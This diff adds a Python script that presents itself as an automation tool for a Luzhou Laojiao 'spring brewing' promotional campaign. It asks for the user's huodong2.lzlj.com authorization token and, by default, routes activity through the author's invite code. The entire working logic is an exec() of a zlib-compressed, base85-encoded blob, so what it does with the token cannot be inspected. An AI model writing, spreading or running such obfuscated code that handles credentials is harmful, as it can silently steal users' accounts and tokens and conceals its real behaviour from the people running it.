@@ -1,0 +1,13 @@
+'''
+泸州老窖春日酿酒
+
+变量：MM_lzlj_crnj
+值：https://huodong2.lzlj.com 下的authorization
+
+可选变量：MM_lzlj_crnj_pool  奖池（也就是等级）
+值：1,2,3,4  选一个 默认1
+活动地址：https://huodong2.lzlj.com/springSip/?fromid=12e563543926cf2e421019cb51efa020&org_id=200282401019674482
+默认走我的邀请
+'''
+import zlib,base64
+exec(zlib.decompress(base64.b85decode('c-qZaTW{M&7Jlci7`P84u`(sfme+Qn1-yZG6Et!S#BB;>4Ps0UrHLsHLsGHhz=gAmBz6$jZa25}1`DK{G(pg~>85Di#!eshpKMG?e)3=F8D1n&mpDngXbFKLXU?2C=R4P-Kr1$LJj7ffdOGVeD}HvcRb-X;&7&34oFV6`#PwXka99QD%+jllLo81*s$SJ0E{f=8$_~NBX~xXSMWR<d<_Hs06NO2XN20l8p4D{6Ix7m(@mTHIj{n`i8Y`FTk8d4Z{_)`QXSHvh`_~?cf>0y|a?4d#p;k$f#{~qJ?NG~;4Dsd4=EZ==^2?P^{k^~YYwPv3)!N-JKU9^BD7Vpy=jt!+AMS3c>hSN!Msu0W;qE_c*KXDy{pfFe)wpz{{_Hsr?C<b<efwU0^UBMWza}~4U*}3L5ygX*t@@2e2bb6Dd)vW`zk20h>qh;{FB(@L``cUl->)6+uI}%wha?Bj?=-gW*VaF8+`A5B{_e`*E)Z<}@6P4$=WpCOxVqtQt~W<uwouRvVwFg^!S~<#8=uy0K7GXo`#bP^98$jK26F(vfdx=W7KD~P1dq)VOT(tg%_s`gKo$d^iAO_w>5R=&5>YW%DG`rY=fQx$_+sD~ipds;BgxCazBi8u(%OIS)$Xo^%7n6lZnd?C0N8(TN9dD9>Vas2NzRj_chqcf)7G}ZqHxQ2y($<bBf&?EA#be%l5kZ>EB?h2g%Gr^mEmw}Y4{$lZZ63Rk?(7c<mT0p6e9WTP!s?>CKcBt#FoNfRrntV$OSrCj@DAkU{V<(kvMJ~I@rM#7x-TcUil?D#DLf>Ys@gHPO&MDBhhoJL`-$l=-Ad=9a|kV%fTHeY-YIx*vFZI>n(|8&$Hd}bQ=7o$gEOU;YmQzStX5ans&KuOQ)!vF5wDEbE(BtBxyeUOQA@Oe5{VbGnNz@oMWV>(2yKS0lCO(3KL;rvJ$m4hb&;H7-Nz`b4xLz&V})&ww$$A#2!xI6yR`*RUMsh?E{8w5Czk2-|1zc`Pd64o4Id_6YL;%;gSl3&o?zl;MAEr=azWlJox;Izj3Sf)kf|1gZe+7`+GP22e<rdUqj$?qFCB911=%Ofmyz!{&3xYvMIK>CM`e~bz*xhJZ<c{kr^zCt<qUq{Y6Z`VNm;<pmX}SVgd;JCa7YCxGsi7GK=z%HQcJM!+<!R(5c&IwI~1f?>-7k<;Nel86wDAtfbLmpjy03I3&&{=(y36EBmAV8pt1kev>4UWjvBINwJ)G`&G^KR;KC`Vu7Lj?d!GG&BNX6{?kj1+Z!<QySC_BpcaAX>ar#=UGfHd-2b}q%>)1D7ad&M65|Y{?L^?_QfTzZz@@HMCZ^p{P7*QOqqYPFr`CDu5lv^sz%kS;$&C!<hKI(oBf60#!&x<>j_Gqbl^8ga&2$E|cfk(UHI14G=~ubR8`Yjr%D1RKk)QBN-trZWl`GDUze#xgJe-cis#kcuRZK-laTNinBjf5Q&oY_k5$D3ss0cv^$7?Qc*t!Y=98=tCg=jH0HiOV{|6g?>(k5MW@WL-ro@>|kpdL3q`ObfFyQ?Gv`4Z7ANOECe?kLGaDU|Djf1iEA{2|62WCc@83On(pRlwKdkruyTgqseKi)R(rHlY(2-)WO7!lB!S#{p$-oi2Pk%{ifSO*kpGfxnJD%B(bpv5T_ml^FmOP{0C1{3F2*anQv;Ld7AriFG0kM8g9qG%x^1kPbGm&7fY!mPG<5TOf4tRgGW2(2E2gJP8d@m6s8qT`CVAn@Yj`IJVq(&*d}9Sm&x^%z}f1H#ie{?@>yB;1XwWq6AAgb%8BW)5PhVl0g!kE;Ea~i;hiyfWl|={wbv9v|&v}CY>j!fOS6fk&Gr_8*-Y=y+^(DNG7MKikd^xd&g%ACsQHqpNT%tWK>{t)Ff#&H>nPfq5{<&R)Dg|4@XXVRLLm05h=5%j%G4LqeECmQ^ez{q)(st(+Lz~kzOim$EFaRDe1JsN|1BY3yb=gsuqhQ`pBHFW=D&pXWH*9ONmGZFH0POdZp_#Vi8mGf)@7c9SOVdp`oiw>AMwgnxj_ijL2WwnlN7Sn{)i7ZLT{&!w(#A`sG8MQ>zn)o`Mf@76E14Ux*2n15y3}=h;kBOM^Lxg82NyPl-r;-{2?-<Z@cg$Z~i4L0{R)cV2T2!Sk;V*-_B&S1mrAw<yA)HaZZpjT97bJKM*X1xjjRMQAeP1;fL<M$DcOPoJ2Y)J{%*IC)Z=e*eVO%qbXjJx6MBmS;O##z1)3uZ?*(Fuls&TQz=7Ywz!@H@<xazQ7;;wihP!HW%n-*rN*EeeAD3ZM=9<yMEQ*-l{)YtN-w@Kg-{=>kHA>DU-Thvn*lLjOvn6GGt+adgUIUE2Rov)E1aC&ue%1O-4r8g)$n>M<0lQu@ny}6>LkqUZzlMTUi!<0^f`&=l')).decode('utf-8'))
